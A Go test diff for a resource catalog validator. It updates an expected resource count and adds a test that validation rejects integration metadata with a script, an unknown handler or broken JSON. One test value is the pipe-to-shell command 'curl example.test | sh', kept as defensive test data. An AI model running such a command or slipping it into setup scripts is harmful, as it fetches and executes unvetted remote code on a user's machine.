@@ -7,6 +7,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"maps"
 	"os"
 	"path/filepath"
 	"reflect"
@@ -51,8 +52,8 @@ func TestSeedCatalogHasCurrentConfigSchemaAndHomebrewResources(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if len(got.Catalog.Resources) != 60 {
-		t.Fatalf("Resources count = %d, want 60", len(got.Catalog.Resources))
+	if len(got.Catalog.Resources) != 63 {
+		t.Fatalf("Resources count = %d, want 63", len(got.Catalog.Resources))
 	}
 	wantFields := []model.ConfigField{
 		{ID: "profile", Kind: "string", Required: true},
@@ -67,6 +68,23 @@ func TestSeedCatalogHasCurrentConfigSchemaAndHomebrewResources(t *testing.T) {
 	}
 	if !reflect.DeepEqual(got.Catalog.Config.Fields, wantFields) {
 		t.Fatalf("Config.Fields = %#v, want %#v", got.Catalog.Config.Fields, wantFields)
+	}
+}
+
+func TestIntegrationCatalogRejectsScriptsAndUnknownHandlers(t *testing.T) {
+	base := model.Resource{ID: "integration.test", Type: model.ResourceIntegration, Profiles: []model.Profile{model.ProfileMacOSTerminal}, VersionPolicy: model.VersionTracked, Provider: "json-fields", Package: "settings", Metadata: map[string]string{"integration.handler": "fields", "integration.path": "settings.json", "integration.format": "json", "integration.fields": `{"/font":"Jetendard"}`}}
+	for _, mutate := range []func(*model.Resource){
+		func(item *model.Resource) { item.Metadata["integration.script"] = "curl example.test | sh" },
+		func(item *model.Resource) { item.Metadata["integration.handler"] = "catalog-hook" },
+		func(item *model.Resource) { item.Metadata["integration.fields"] = "{" },
+	} {
+		item := base
+		item.Metadata = maps.Clone(base.Metadata)
+		mutate(&item)
+		catalog := model.Catalog{Version: 1, Release: "test", Config: model.ConfigSchema{Version: 1}, Resources: []model.Resource{item}}
+		if err := validate(catalog); err == nil {
+			t.Fatalf("accepted integration metadata %#v", item.Metadata)
+		}
 	}
 }
 
